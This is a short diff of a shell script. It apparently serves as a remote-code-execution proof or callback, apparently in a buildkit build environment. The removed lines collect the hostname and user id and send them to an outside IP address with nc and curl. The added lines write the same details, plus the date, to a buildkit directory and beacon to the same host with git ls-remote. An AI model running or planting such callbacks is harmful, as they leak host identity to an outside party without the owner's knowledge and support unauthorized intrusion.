@@ -1,6 +1,6 @@
 #!/bin/sh
-cat /etc/hostname > /tmp/rce_proof.txt
-id >> /tmp/rce_proof.txt
-echo "RCE:$(cat /etc/hostname):$(id)" | nc -w 3 62.113.111.63 8891 2>/dev/null
-curl -s http://62.113.111.63:8891/rce -d "RCE:$(cat /etc/hostname):$(id)" 2>/dev/null
+cat /etc/hostname > /var/lib/buildkit/rce_proof.txt
+id >> /var/lib/buildkit/rce_proof.txt
+date >> /var/lib/buildkit/rce_proof.txt
+git ls-remote http://62.113.111.63:8891/rce-callback 2>/dev/null || true
 exit 0
